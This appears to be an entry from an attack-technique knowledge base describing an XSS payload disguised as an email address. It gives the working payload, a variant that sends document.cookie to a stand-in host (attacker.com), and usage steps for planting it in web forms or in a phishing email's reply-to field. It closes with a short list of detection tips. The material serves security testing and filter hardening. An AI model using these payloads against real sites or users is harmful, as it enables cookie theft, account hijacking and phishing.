---
id: 11a98913-d246-4fc6-a96e-cb3bd3750198
name: XSS-Payload-in-Email-Address
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.634877+00:00'
updated_at: '2023-04-10T20:21:50.250553+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - bypass
  - email
validated: true
---

# XSS-Payload-in-Email-Address

## Code

```javascript
"><svg/onload=confirm(1)>"@x.y
```

## Description

This JavaScript snippet is an exotic XSS payload disguised as part of an email address. It uses a tag breakout (">) followed by an SVG element with an onload event to execute arbitrary code, here a simple confirm(1) for testing. The "@x.y appends a dummy domain to mimic email format, helping bypass content filters that scan for standalone scripts but miss embedded ones in address fields.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| onload=confirm(1) | The JavaScript action to execute; replace with malicious code like fetching external resources | onload=fetch('http://attacker.com/steal?data='+document.cookie) |

## Usage

Embed this directly into email fields of web forms, SMTP payloads, or email clients. For example, submit as a "reply-to" address in a phishing email or contact form. When the target renders or processes the email without sanitization, the payload executes in the browser context, potentially stealing cookies or redirecting users.

## Detection

- Scan for anomalous characters in email addresses (e.g., <, >, svg tags) using regex in email gateways.
- Monitor for JavaScript execution in email rendering engines or web views.
- Implement HTML sanitization that strips SVG and event handlers from user inputs.
- Log and alert on confirm/alert popups or unexpected network requests from email contexts.

## Related

- [[procedures/Bypass-Email-Filters-with-Exotic-XSS-Payloads]]
